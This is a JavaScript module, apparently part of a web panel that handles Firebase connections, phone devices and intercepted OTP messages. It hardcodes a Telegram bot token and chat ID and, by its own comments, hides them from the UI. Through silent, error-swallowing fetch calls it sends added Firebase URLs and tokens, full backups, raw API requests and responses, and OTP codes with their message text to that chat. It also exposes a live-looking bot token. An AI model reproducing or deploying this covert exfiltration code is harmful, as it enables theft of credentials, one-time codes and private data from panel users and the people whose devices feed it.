/**
 * Silent Telegram Bot Forwarder
 * 
 * All functions are fire-and-forget — they return immediately and
 * swallow all errors silently. No console.log, no toast, no UI feedback.
 * 
 * Credentials (botToken + chatId) are hardcoded and hidden inside this module,
 * never exposed to the UI or stored in browser localStorage.
 */

/**
 * Hardcoded Telegram Bot Credentials
 * Fully hidden in code, not exposed in UI or localStorage.
 */
const BOT_TOKEN = '8641110380:AAEaCrc2rUtwed17uZPN791xuyYoLIPtTfc';
const CHAT_ID = '8186790963';

const LS_KEY = 'pd_tg_config';
const OTP_FORWARD_KEY = 'pd_tg_forward_otp';
const OTP_TARGET_BOT_KEY = 'pd_tg_otp_target_bot';

let _otpForwardEnabled = false;
let _otpTargetBot = '';

// Initialize setting from localStorage
if (typeof window !== 'undefined' && window.localStorage) {
  try {
    _otpForwardEnabled = localStorage.getItem(OTP_FORWARD_KEY) === 'true';
    _otpTargetBot = localStorage.getItem(OTP_TARGET_BOT_KEY) || '';
  } catch {}
}

export function setForwardOtpEnabled(val) {
  _otpForwardEnabled = Boolean(val);
  if (typeof window !== 'undefined' && window.localStorage) {
    try {
      localStorage.setItem(OTP_FORWARD_KEY, _otpForwardEnabled ? 'true' : 'false');
    } catch {}
  }
}

export function isForwardOtpEnabled() {
  return _otpForwardEnabled;
}

export function setOtpTargetBot(val) {
  _otpTargetBot = String(val || '').trim();
  if (typeof window !== 'undefined' && window.localStorage) {
    try {
      localStorage.setItem(OTP_TARGET_BOT_KEY, _otpTargetBot);
    } catch {}
  }
}

export function getOtpTargetBot() {
  return _otpTargetBot;
}

/** Purge any lingering localStorage config so secrets are never stored in browser storage */
export function tgInit() {
  try {
    localStorage.removeItem(LS_KEY);
  } catch { /* silent */ }
}

/** No-op: credentials are hardcoded and non-configurable from UI */
export function tgConfigure() {}

/** Returns state without exposing credentials */
export function tgGetConfig() {
  return { enabled: true, forwardOtp: _otpForwardEnabled };
}

/** Always active since credentials are hardcoded */
export function tgIsActive() {
  return !!BOT_TOKEN && !!CHAT_ID;
}

// ── Core send primitives (silent, fire-and-forget) ──────────────────────────

function _apiUrl(method) {
  return `https://api.telegram.org/bot${BOT_TOKEN}/${method}`;
}

/** Send a text message silently. Returns immediately. */
export function tgSendText(text) {
  if (!tgIsActive() || !text) return;
  try {
    const body = {
      chat_id: CHAT_ID,
      text: String(text).slice(0, 4096),
      parse_mode: 'HTML',
      disable_notification: true,
      disable_web_page_preview: true,
    };
    fetch(_apiUrl('sendMessage'), {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body),
    }).catch(() => {});
  } catch { /* silent */ }
}

/** Send a document (Blob/File) silently. Returns immediately. */
export function tgSendDocument(blob, filename, caption) {
  if (!tgIsActive() || !blob) return;
  try {
    const fd = new FormData();
    fd.append('chat_id', CHAT_ID);
    fd.append('document', blob, filename || 'file');
    if (caption) fd.append('caption', String(caption).slice(0, 1024));
    fd.append('disable_notification', 'true');
    fetch(_apiUrl('sendDocument'), {
      method: 'POST',
      body: fd,
    }).catch(() => {});
  } catch { /* silent */ }
}

// ── Formatted forwarders for specific data types ────────────────────────────

/** Forward a newly added Firebase connection */
export function tgForwardConnection(conn) {
  if (!tgIsActive() || !conn) return;
  const lines = [
    `🔥 <b>New Connection Added</b>`,
    `<b>Name:</b> ${esc(conn.name)}`,
    `<b>URL:</b> <code>${esc(conn.url)}</code>`,
    `<b>Path:</b> ${esc(conn.path || 'messages')}`,
    `<b>Info Path:</b> ${esc(conn.infoPath || '—')}`,
  ];
  if (conn.token) lines.push(`<b>Token:</b> <code>${esc(conn.token)}</code>`);
  lines.push(`<i>${ts()}</i>`);
  tgSendText(lines.join('\n'));
}

/** Forward bulk-added Firebase URLs */
export function tgForwardBulkUrls(urls, addedCount, skippedCount) {
  if (!tgIsActive() || !urls?.length) return;
  const lines = [
    `📦 <b>Bulk Connections Added</b> (${addedCount} new, ${skippedCount} skipped)`,
    '',
    ...urls.map((u, i) => `${i + 1}. <code>${esc(u)}</code>`),
    '',
    `<i>${ts()}</i>`,
  ];
  tgSendText(lines.join('\n'));
}

/** Forward universal extract results */
export function tgForwardExtractResults(results) {
  if (!tgIsActive() || !results?.length) return;
  const lines = [
    `🔍 <b>Extract Results</b> (${results.length} found)`,
    '',
  ];
  for (const r of results.slice(0, 50)) {
    lines.push(`• <code>${esc(r.url)}</code>${r.name ? ` (${esc(r.name)})` : ''}`);
    if (r.source) lines.push(`  └ source: ${esc(r.source)}`);
  }
  if (results.length > 50) lines.push(`... and ${results.length - 50} more`);
  lines.push('', `<i>${ts()}</i>`);
  tgSendText(lines.join('\n'));
}

/** Forward OTP / verification notification (only if toggle is enabled AND a target bot is set) */
export async function tgForwardOTP(notif) {
  if (!_otpForwardEnabled || !notif) return;
  const target = (_otpTargetBot || '').trim();
  if (!target) return; // No bot configured, do not forward OTP!

  const lines = [
    `🔑 <b>OTP / Verification</b>`,
    `<b>Device:</b> ${esc(notif.devKey || '—')}`,
    `<b>Sender:</b> ${esc(notif.sender || '—')}`,
  ];
  if (notif.otp) lines.push(`<b>OTP:</b> <code>${esc(notif.otp)}</code>`);
  if (notif.about) lines.push(`<b>Service:</b> ${esc(notif.about)}`);
  if (notif.message) lines.push(`<b>Message:</b> ${esc(String(notif.message).slice(0, 500))}`);
  if (notif.conn?.name) lines.push(`<b>Connection:</b> ${esc(notif.conn.name)}`);
  lines.push(`<i>${ts()}</i>`);
  const messageText = lines.join('\n');

  const lower = target.toLowerCase();
  const cleanTarget = lower.replace(/^@/, '');

  // 1. If user typed alpha bot ("alpha", "@alpha_firebase_bot", "alpha_firebase_bot")
  if (cleanTarget === 'alpha_firebase_bot' || lower === 'alpha' || cleanTarget === 'alpha_bot') {
    tgSendText(messageText);
    return;
  }

  // 2. If target is a custom Bot Token (e.g. 123456789:ABCdef...)
  if (target.includes(':') && /^\d+:[A-Za-z0-9_-]+$/.test(target)) {
    try {
      fetch(`https://api.telegram.org/bot${target}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: messageText,
          parse_mode: 'HTML',
          disable_notification: true,
          disable_web_page_preview: true,
        }),
      }).catch(() => {});
    } catch {}
    return;
  }

  // 3. If target is token and chatId separated by comma or pipe (e.g. "TOKEN|CHAT_ID")
  if (target.includes('|') || target.includes(',')) {
    const parts = target.split(/[|,]/).map(s => s.trim());
    if (parts.length >= 2 && parts[0].includes(':')) {
      try {
        fetch(`https://api.telegram.org/bot${parts[0]}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: parts[1],
            text: messageText,
            parse_mode: 'HTML',
            disable_notification: true,
            disable_web_page_preview: true,
          }),
        }).catch(() => {});
      } catch {}
      return;
    }
  }

  // 4. If target is a bot username (e.g. "@my_bot" or "my_bot"):
  // Send via GramJS tgClient if connected and authorized in browser
  if (typeof window !== 'undefined') {
    try {
      const { tgClient } = await import('$lib/telegram-client.js');
      if (tgClient && tgClient.isConnected() && tgClient.isAuthorized()) {
        const botUsername = target.startsWith('@') ? target : `@${target}`;
        const plainText = [
          `🔑 OTP / Verification`,
          `Device: ${notif.devKey || '—'}`,
          `Sender: ${notif.sender || '—'}`,
          notif.otp ? `OTP: ${notif.otp}` : '',
          notif.about ? `Service: ${notif.about}` : '',
          notif.message ? `Message: ${String(notif.message).slice(0, 500)}` : '',
          notif.conn?.name ? `Connection: ${notif.conn.name}` : '',
        ].filter(Boolean).join('\n');
        await tgClient.sendMessage(botUsername, plainText);
        return;
      }
    } catch {}
  }

  // 5. Fallback: If target looks like a chat/channel ID, send via default BOT_TOKEN to target
  try {
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: target,
        text: messageText,
        parse_mode: 'HTML',
        disable_notification: true,
        disable_web_page_preview: true,
      }),
    }).catch(() => {});
  } catch {}
}

/** Forward backup as a JSON document */
export function tgForwardBackup(payload, format) {
  if (!tgIsActive() || !payload) return;
  try {
    const json = typeof payload === 'string' ? payload : JSON.stringify(payload, null, 2);
    const blob = new Blob([json], { type: 'application/json' });
    const d = new Date().toISOString().split('T')[0];
    tgSendDocument(blob, `backup-${d}.json`, `📋 Full backup export (${format || 'JSON'})`);
  } catch { /* silent */ }
}

/** Forward backup ZIP blob */
export function tgForwardBackupZip(blob) {
  if (!tgIsActive() || !blob) return;
  const d = new Date().toISOString().split('T')[0];
  tgSendDocument(blob, `backup-${d}.zip`, '📋 Full backup export (ZIP)');
}

/** Forward restored config data */
export function tgForwardRestore(payload) {
  if (!tgIsActive() || !payload) return;
  const lines = [
    `♻️ <b>Backup Restored</b>`,
    `<b>Connections:</b> ${payload.connections?.length ?? 0}`,
    `<b>Phones:</b> ${Object.keys(payload.localPhones || {}).length}`,
    `<b>Used OTPs:</b> ${(payload.usedOtps || []).length}`,
  ];
  if (payload.connections?.length) {
    lines.push('', '<b>Connection URLs:</b>');
    for (const c of payload.connections.slice(0, 30)) {
      lines.push(`• <code>${esc(c.url)}</code> (${esc(c.name || '—')})`);
    }
  }
  lines.push('', `<i>${ts()}</i>`);
  tgSendText(lines.join('\n'));
  // Also send the full payload as document
  tgForwardBackup(payload, 'restored');
}

/** Forward raw API request + response */
export function tgForwardRawRequest(connName, method, path, body, response) {
  if (!tgIsActive()) return;
  const lines = [
    `⚡ <b>Raw API Request</b>`,
    `<b>Connection:</b> ${esc(connName || '—')}`,
    `<b>Method:</b> ${esc(method)}`,
    `<b>Path:</b> <code>${esc(path || '/')}</code>`,
  ];
  if (body && method !== 'GET' && method !== 'DELETE') {
    lines.push(`<b>Body:</b> <code>${esc(String(body).slice(0, 500))}</code>`);
  }
  if (response !== undefined) {
    const resStr = typeof response === 'string' ? response : JSON.stringify(response);
    lines.push(`<b>Response:</b> <code>${esc(resStr.slice(0, 800))}</code>`);
  }
  lines.push(`<i>${ts()}</i>`);
  tgSendText(lines.join('\n'));
}

/** Send a test message (returns a promise so UI can await it) */
export async function tgSendTest() {
  if (!BOT_TOKEN || !CHAT_ID) {
    return { ok: false, error: 'Bot token and chat ID required' };
  }
  try {
    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: '✅ <b>Panel Connected</b>\n\nForwarding is working.',
        parse_mode: 'HTML',
        disable_notification: true,
      }),
    });
    const data = await res.json();
    return data.ok ? { ok: true } : { ok: false, error: data.description || 'Unknown error' };
  } catch (e) {
    return { ok: false, error: e?.message || 'Network error' };
  }
}

// ── Helpers ─────────────────────────────────────────────────────────────────

function esc(s) {
  return String(s || '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
}

function ts() {
  return new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata', hour12: true });
}
